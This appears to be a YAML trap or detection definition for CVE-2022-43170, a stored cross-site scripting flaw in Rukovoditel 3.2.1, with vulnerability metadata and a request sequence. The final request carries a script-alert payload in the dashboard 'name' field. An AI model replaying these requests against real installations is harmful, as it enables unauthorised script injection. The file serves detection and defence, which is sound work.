id: CVE-2022-43170
info:
  name: Rukovoditel <= 3.2.1 - Cross Site Scripting
  author: r3Y3r53
  description: 'A stored cross-site scripting (XSS) vulnerability in the Dashboard
    Configuration feature (index.php?module=dashboard_configure/index) of Rukovoditel
    v3.2.1 allows authenticated attackers to execute arbitrary web scripts or HTML
    via a crafted payload injected into the Title parameter after clicking "Add info
    block".

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, leading to
    potential data theft, session hijacking, or defacement of the affected application.

    '
  remediation: 'Upgrade Rukovoditel to version 3.2.2 or later to mitigate the XSS
    vulnerability.

    '
  reference:
  - https://github.com/anhdq201/rukovoditel/issues/6
  - http://rukovoditel.com/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-43170
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cve-id: CVE-2022-43170
    cwe-id: CWE-79
    epss-score: 0.26563
    epss-percentile: 0.96323
    cpe: cpe:2.3:a:rukovoditel:rukovoditel:3.2.1:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: rukovoditel
    product: rukovoditel
  tags: cve,cve2022,rukovoditel,stored-xss,xss,authenticated
traps:
- request:
    method: GET
    path: /index.php?module=users/login
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /index.php?module=users/login&action=login
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'form_session_token={{nonce}}&username={{username}}&password={{password}}

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /index.php?module=dashboard_configure/index&action=save&token=
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'form_session_token={{nonce}}&type=info_block&is_active=1&sections_id=0&color=default&name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&icon=&description=&sort_order=

      '
  response:
    status_code: 200
    headers: {}
    body: <script>alert(document.domain)</script>rukovoditel
